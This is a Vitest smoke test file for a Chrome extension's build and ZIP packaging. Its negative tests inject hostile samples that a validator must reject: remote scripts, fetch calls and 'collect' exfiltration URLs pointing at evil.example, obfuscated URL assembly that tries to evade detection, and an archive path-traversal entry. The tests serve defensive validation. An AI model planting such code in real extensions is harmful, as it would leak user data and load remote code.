/**
 * FILE: release-artifacts.smoke.test.ts
 *
 * WHAT: Executable contracts for the Chrome runtime and release packaging seams.
 *
 * WHY: A build is only shippable when Chrome can resolve every manifest entry and
 * the uploaded ZIP is an exact, safe copy of the validated extension directory.
 *
 * HOW DATA FLOWS:
 *   1. TypeScript and static inputs cross SEAM-REL-01/02 into a temporary dist tree.
 *   2. Chrome runtime paths cross SEAM-RUN-01/02 from manifest/HTML to root bundles.
 *   3. The validated dist tree crosses SEAM-REL-03 into a deterministic ZIP.
 *
 * SEAMS:
 *   IN: Build and source assets -> smoke contracts (SEAM-REL-01/02, SEAM-RUN-01/02)
 *   OUT: Smoke contracts -> validated ZIP evidence (SEAM-REL-03)
 *
 * CONTRACT: ExtensionReleaseArtifact v1.0.0
 * GENERATED: 2026-08-12
 * CUSTOM SECTIONS: None
 */

import { mkdtemp, readFile, rm, unlink, writeFile } from 'node:fs/promises';
import path from 'node:path';
import { strToU8, zipSync } from 'fflate';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { buildExtension } from '../../scripts/build.mjs';
import {
  listRelativeFiles,
  packageExtension,
  validateChecksumFile,
  validateDist,
  validateZip,
} from '../../scripts/lib/release-artifacts.mjs';

const projectRoot = path.resolve(import.meta.dirname, '../..');
let temporaryRoot = '';
let distDir = '';
let zipPath = '';

beforeAll(async () => {
  temporaryRoot = await mkdtemp(path.join(projectRoot, '.tabbymctabface-release-'));
  distDir = path.join(temporaryRoot, 'dist');
  zipPath = path.join(temporaryRoot, 'TabbyMcTabface.zip');
  await buildExtension({ projectRoot, outDir: distDir, logLevel: 'silent' });
});

afterAll(async () => {
  if (temporaryRoot) {
    await rm(temporaryRoot, { recursive: true, force: true });
  }
});

describe('ExtensionReleaseArtifact CONTRACT v1.0.0', () => {
  it('SEAM-REL-01 emits bundled JavaScript at Chrome runtime roots', async () => {
    const files = await listRelativeFiles(distDir);

    expect(files).toContain('background.js');
    expect(files).toContain('popup.js');
    expect(files).not.toContain('dist/background.js');
    expect(files.some((file) => file.endsWith('.ts'))).toBe(false);
    expect(files.some((file) => file.endsWith('.map'))).toBe(false);

    const [backgroundBundle, popupBundle] = await Promise.all([
      readFile(path.join(distDir, 'background.js'), 'utf8'),
      readFile(path.join(distDir, 'popup.js'), 'utf8'),
    ]);
    expect(backgroundBundle.length).toBeGreaterThan(1_000);
    expect(popupBundle.length).toBeGreaterThan(1_000);
  });

  it('SEAM-RUN-01/02 resolves every manifest, icon, script, and stylesheet path', async () => {
    const report = await validateDist(distDir);

    expect(report.manifest.manifest_version).toBe(3);
    expect(report.manifest.background?.service_worker).toBe('background.js');
    expect(report.manifest.action?.default_popup).toBe('popup.html');
    expect(report.manifest.content_security_policy?.extension_pages)
      .toBe("default-src 'self'; script-src 'self'; object-src 'none'; connect-src 'none'; img-src 'self'; style-src 'self'; base-uri 'none'; frame-ancestors 'none';");
    expect(report.files).toContain('icons/icon128.png');
    expect(report.files).toContain('popup.css');

    for (const [size, iconPath] of Object.entries(report.manifest.icons ?? {})) {
      const icon = await readFile(path.join(distDir, String(iconPath)));
      expect(icon.readUInt32BE(16)).toBe(Number(size));
      expect(icon.readUInt32BE(20)).toBe(Number(size));
      const colourType = icon[25];
      const hasTransparencyChunk = icon.indexOf(Buffer.from('tRNS', 'ascii'), 8) >= 0;
      expect(colourType === 4 || colourType === 6 || (colourType === 3 && hasTransparencyChunk)).toBe(true);
    }
  });

  it('SEAM-REL-03 packages a deterministic, exact dist mirror', async () => {
    const first = await packageExtension({ distDir, zipPath });
    const firstBytes = await readFile(zipPath);
    const second = await packageExtension({ distDir, zipPath });
    const secondBytes = await readFile(zipPath);

    expect(first.files).toEqual(second.files);
    expect(firstBytes.equals(secondBytes)).toBe(true);
    await expect(validateZip(zipPath, distDir)).resolves.toMatchObject({
      files: first.files,
    });
    await expect(validateChecksumFile(second)).resolves.toBe(`${zipPath}.sha256`);
  });

  it('produces identical ZIP bytes across build-machine time zones', async () => {
    const originalTimeZone = process.env.TZ;
    try {
      process.env.TZ = 'UTC';
      await packageExtension({ distDir, zipPath });
      const utcBytes = await readFile(zipPath);

      process.env.TZ = 'America/Detroit';
      await packageExtension({ distDir, zipPath });
      const detroitBytes = await readFile(zipPath);

      expect(detroitBytes.equals(utcBytes)).toBe(true);
    } finally {
      if (originalTimeZone === undefined) delete process.env.TZ;
      else process.env.TZ = originalTimeZone;
    }
  });

  it('fails closed when a required runtime artifact disappears', async () => {
    const popupBundlePath = path.join(distDir, 'popup.js');
    const popupBundle = await readFile(popupBundlePath);
    await unlink(popupBundlePath);

    await expect(validateDist(distDir)).rejects.toThrow(/popup\.js/i);
    await writeFile(popupBundlePath, popupBundle);
  });

  it('rejects an unresolved local import in a browser bundle', async () => {
    const popupBundlePath = path.join(distDir, 'popup.js');
    const popupBundle = await readFile(popupBundlePath, 'utf8');
    await writeFile(popupBundlePath, `${popupBundle}\nimport './missing-module.js';\n`);

    await expect(validateDist(distDir)).rejects.toThrow(/unresolved local module import/i);
    await writeFile(popupBundlePath, popupBundle);
  });

  it('rejects syntax-invalid JavaScript bundles', async () => {
    const popupBundlePath = path.join(distDir, 'popup.js');
    const popupBundle = await readFile(popupBundlePath, 'utf8');
    await writeFile(popupBundlePath, `${popupBundle}\nfunction broken( {\n`);

    await expect(validateDist(distDir)).rejects.toThrow(/invalid JavaScript syntax/i);
    await writeFile(popupBundlePath, popupBundle);
  });

  it('rejects remote executable references in popup HTML', async () => {
    const popupPath = path.join(distDir, 'popup.html');
    const originalPopup = await readFile(popupPath, 'utf8');
    await writeFile(
      popupPath,
      originalPopup.replace('</body>', '<script src="https://evil.example/remote.js"></script></body>'),
    );

    await expect(validateDist(distDir)).rejects.toThrow(/remote (?:executable|resource) reference/i);
    await writeFile(popupPath, originalPopup);
  });

  it('rejects unquoted remote executable references in popup HTML', async () => {
    const popupPath = path.join(distDir, 'popup.html');
    const originalPopup = await readFile(popupPath, 'utf8');
    await writeFile(
      popupPath,
      originalPopup.replace('</body>', '<script src=https://evil.example/remote.js></script></body>'),
    );

    await expect(validateDist(distDir)).rejects.toThrow(/remote (?:executable|resource) reference/i);
    await writeFile(popupPath, originalPopup);
  });

  it('rejects meta-refresh navigation in popup HTML', async () => {
    const popupPath = path.join(distDir, 'popup.html');
    const originalPopup = await readFile(popupPath, 'utf8');
    await writeFile(
      popupPath,
      originalPopup.replace('</head>', '<meta http-equiv="refresh" content="0; url=https://evil.example/collect"></head>'),
    );

    await expect(validateDist(distDir)).rejects.toThrow(/meta refresh navigation/i);
    await writeFile(popupPath, originalPopup);
  });

  it('rejects remote image and stylesheet references in popup HTML', async () => {
    const popupPath = path.join(distDir, 'popup.html');
    const originalPopup = await readFile(popupPath, 'utf8');
    await writeFile(
      popupPath,
      originalPopup.replace('</body>', '<img src="https://evil.example/track.png"></body>'),
    );

    await expect(validateDist(distDir)).rejects.toThrow(/remote resource reference/i);
    await writeFile(popupPath, originalPopup);
  });

  it('rejects remote resources imported through packaged CSS', async () => {
    const stylesheetPath = path.join(distDir, 'popup.css');
    const originalStylesheet = await readFile(stylesheetPath, 'utf8');
    await writeFile(
      stylesheetPath,
      `${originalStylesheet}\n.remote { background: url(https://evil.example/pixel.png); }`,
    );

    await expect(validateDist(distDir)).rejects.toThrow(/remote resource reference/i);
    await writeFile(stylesheetPath, originalStylesheet);
  });

  it('rejects network and dynamic-code capabilities in packaged bundles', async () => {
    const popupBundlePath = path.join(distDir, 'popup.js');
    const popupBundle = await readFile(popupBundlePath, 'utf8');
    await writeFile(popupBundlePath, `${popupBundle}\nfetch('https://evil.example/payload');\n`);

    await expect(validateDist(distDir)).rejects.toThrow(/forbidden fetch capability/i);
    await writeFile(popupBundlePath, popupBundle);
  });

  it('rejects external navigation or exfiltration URLs embedded in a bundle', async () => {
    const backgroundBundlePath = path.join(distDir, 'background.js');
    const backgroundBundle = await readFile(backgroundBundlePath, 'utf8');
    await writeFile(
      backgroundBundlePath,
      `${backgroundBundle}\nchrome.tabs.create({ url: 'https://evil.example/collect?d=proof' });\n`,
    );

    await expect(validateDist(distDir)).rejects.toThrow(/forbidden (?:external URL|browser navigation capability)/i);
    await writeFile(backgroundBundlePath, backgroundBundle);
  });

  it('rejects browser navigation even when an external URL is assembled dynamically', async () => {
    const backgroundBundlePath = path.join(distDir, 'background.js');
    const backgroundBundle = await readFile(backgroundBundlePath, 'utf8');
    await writeFile(
      backgroundBundlePath,
      `${backgroundBundle}\nconst scheme = 'ht'; const destination = scheme + 'tps://evil.example/collect'; chrome.tabs.create({ url: destination });\n`,
    );

    await expect(validateDist(distDir)).rejects.toThrow(/browser navigation capability/i);
    await writeFile(backgroundBundlePath, backgroundBundle);
  });

  it('rejects aliased tab navigation with a dynamically assembled URL', async () => {
    const backgroundBundlePath = path.join(distDir, 'background.js');
    const backgroundBundle = await readFile(backgroundBundlePath, 'utf8');
    await writeFile(
      backgroundBundlePath,
      `${backgroundBundle}\nconst scheme = 'ht'; const destination = scheme + 'tps://evil.example/collect'; const tabApi = chrome.tabs; tabApi.create({ url: destination });\n`,
    );

    await expect(validateDist(distDir)).rejects.toThrow(/browser navigation capability/i);
    await writeFile(backgroundBundlePath, backgroundBundle);
  });

  it('rejects global open navigation with a dynamically assembled URL', async () => {
    const popupBundlePath = path.join(distDir, 'popup.js');
    const popupBundle = await readFile(popupBundlePath, 'utf8');
    await writeFile(
      popupBundlePath,
      `${popupBundle}\nconst scheme = 'ht'; const destination = scheme + 'tps://evil.example/collect'; globalThis.open(destination);\n`,
    );

    await expect(validateDist(distDir)).rejects.toThrow(/browser navigation capability/i);
    await writeFile(popupBundlePath, popupBundle);
  });

  it('rejects destructured Chrome tab navigation', async () => {
    const backgroundBundlePath = path.join(distDir, 'background.js');
    const backgroundBundle = await readFile(backgroundBundlePath, 'utf8');
    await writeFile(
      backgroundBundlePath,
      `${backgroundBundle}\nconst scheme = 'ht'; const destination = scheme + 'tps://evil.example/collect'; const { tabs } = chrome; tabs.update(1, { url: destination });\n`,
    );

    await expect(validateDist(distDir)).rejects.toThrow(/browser navigation capability/i);
    await writeFile(backgroundBundlePath, backgroundBundle);
  });

  it('rejects navigation through an aliased Chrome root', async () => {
    const backgroundBundlePath = path.join(distDir, 'background.js');
    const backgroundBundle = await readFile(backgroundBundlePath, 'utf8');
    await writeFile(
      backgroundBundlePath,
      `${backgroundBundle}\nconst scheme = 'ht'; const destination = scheme + 'tps://evil.example/collect'; const browserApi = chrome; browserApi.tabs.update(1, { url: destination });\n`,
    );

    await expect(validateDist(distDir)).rejects.toThrow(/browser navigation capability/i);
    await writeFile(backgroundBundlePath, backgroundBundle);
  });

  it('rejects location method navigation', async () => {
    const popupBundlePath = path.join(distDir, 'popup.js');
    const popupBundle = await readFile(popupBundlePath, 'utf8');
    await writeFile(
      popupBundlePath,
      `${popupBundle}\nconst scheme = 'ht'; const destination = scheme + 'tps://evil.example/collect'; location.assign(destination);\n`,
    );

    await expect(validateDist(distDir)).rejects.toThrow(/browser navigation capability/i);
    await writeFile(popupBundlePath, popupBundle);
  });

  it('allows an unrelated object method named fetch', async () => {
    const popupBundlePath = path.join(distDir, 'popup.js');
    const popupBundle = await readFile(popupBundlePath, 'utf8');
    await writeFile(
      popupBundlePath,
      `${popupBundle}\nconst localCache = { fetch() { return 'local'; } }; localCache.fetch();\n`,
    );

    await expect(validateDist(distDir)).resolves.toBeTruthy();
    await writeFile(popupBundlePath, popupBundle);
  });

  it('rejects an uninstall URL assembled at runtime', async () => {
    const backgroundBundlePath = path.join(distDir, 'background.js');
    const backgroundBundle = await readFile(backgroundBundlePath, 'utf8');
    await writeFile(
      backgroundBundlePath,
      `${backgroundBundle}\nconst scheme = 'ht'; chrome.runtime.setUninstallURL(scheme + 'tps://evil.example/collect');\n`,
    );

    await expect(validateDist(distDir)).rejects.toThrow(/browser navigation capability/i);
    await writeFile(backgroundBundlePath, backgroundBundle);
  });

  it('rejects dynamically targeted anchor navigation', async () => {
    const popupBundlePath = path.join(distDir, 'popup.js');
    const popupBundle = await readFile(popupBundlePath, 'utf8');
    await writeFile(
      popupBundlePath,
      `${popupBundle}\nconst scheme = 'ht'; const anchor = document.createElement('a'); anchor.href = scheme + 'tps://evil.example/collect'; anchor.click();\n`,
    );

    await expect(validateDist(distDir)).rejects.toThrow(/(?:DOM|location) navigation capability/i);
    await writeFile(popupBundlePath, popupBundle);
  });

  it('rejects dynamically targeted form navigation', async () => {
    const popupBundlePath = path.join(distDir, 'popup.js');
    const popupBundle = await readFile(popupBundlePath, 'utf8');
    await writeFile(
      popupBundlePath,
      `${popupBundle}\nconst scheme = 'ht'; const form = document.createElement('form'); form.action = scheme + 'tps://evil.example/collect'; form.submit();\n`,
    );

    await expect(validateDist(distDir)).rejects.toThrow(/(?:DOM|location) navigation capability/i);
    await writeFile(popupBundlePath, popupBundle);
  });

  it('does not mistake inert string content for a network call', async () => {
    const popupBundlePath = path.join(distDir, 'popup.js');
    const popupBundle = await readFile(popupBundlePath, 'utf8');
    await writeFile(popupBundlePath, `${popupBundle}\nconst inertDocumentation = 'fetch(';\n`);

    await expect(validateDist(distDir)).resolves.toBeTruthy();
    await writeFile(popupBundlePath, popupBundle);
  });

  it('rejects a relaxed extension-page CSP', async () => {
    const manifestPath = path.join(distDir, 'manifest.json');
    const originalManifest = await readFile(manifestPath, 'utf8');
    const relaxedManifest = JSON.parse(originalManifest);
    relaxedManifest.content_security_policy.extension_pages = "script-src 'self'; object-src 'self'";
    await writeFile(manifestPath, JSON.stringify(relaxedManifest));

    await expect(validateDist(distDir)).rejects.toThrow(/content_security_policy/i);
    await writeFile(manifestPath, originalManifest);
  });

  it('rejects a ZIP whose contents no longer match validated dist', async () => {
    await packageExtension({ distDir, zipPath });
    await writeFile(path.join(distDir, 'popup.css'), '/* changed after packaging */');

    await expect(validateZip(zipPath, distDir)).rejects.toThrow(/content|match|mismatch/i);

    await buildExtension({ projectRoot, outDir: distDir, logLevel: 'silent' });
  });

  it('rejects a reserved reopen-tab shortcut in the packaged manifest', async () => {
    const manifestPath = path.join(distDir, 'manifest.json');
    const originalManifest = await readFile(manifestPath, 'utf8');
    const unsafeManifest = JSON.parse(originalManifest);
    unsafeManifest.commands._execute_action.suggested_key.default = 'Ctrl+Shift+T';
    await writeFile(manifestPath, JSON.stringify(unsafeManifest));

    await expect(validateDist(distDir)).rejects.toThrow(/reopen-tab|Ctrl\+Shift\+Y/i);
    await writeFile(manifestPath, originalManifest);
  });

  it('rejects manifest privilege expansion beyond the published privacy contract', async () => {
    const manifestPath = path.join(distDir, 'manifest.json');
    const originalManifest = await readFile(manifestPath, 'utf8');
    const overPrivilegedManifest = JSON.parse(originalManifest);
    overPrivilegedManifest.host_permissions = ['<all_urls>'];
    await writeFile(manifestPath, JSON.stringify(overPrivilegedManifest));

    await expect(validateDist(distDir)).rejects.toThrow(/host_permissions|permissions/i);
    await writeFile(manifestPath, originalManifest);
  });

  it('rejects optional privileges and additional commands', async () => {
    const manifestPath = path.join(distDir, 'manifest.json');
    const originalManifest = await readFile(manifestPath, 'utf8');
    const expandedManifest = JSON.parse(originalManifest);
    expandedManifest.optional_permissions = ['history', 'bookmarks'];
    expandedManifest.commands.nuke_tabs = { description: 'Surprise' };
    await writeFile(manifestPath, JSON.stringify(expandedManifest));

    await expect(validateDist(distDir)).rejects.toThrow(/manifest keys|commands|optional_permissions/i);
    await writeFile(manifestPath, originalManifest);
  });

  it('rejects archive traversal paths before attempting extraction', async () => {
    const unsafeZip = zipSync({
      '../escaped.txt': strToU8('must never leave the artifact root'),
    });
    await writeFile(zipPath, unsafeZip);

    await expect(validateZip(zipPath, distDir)).rejects.toThrow(/escape|path/i);
  });
});
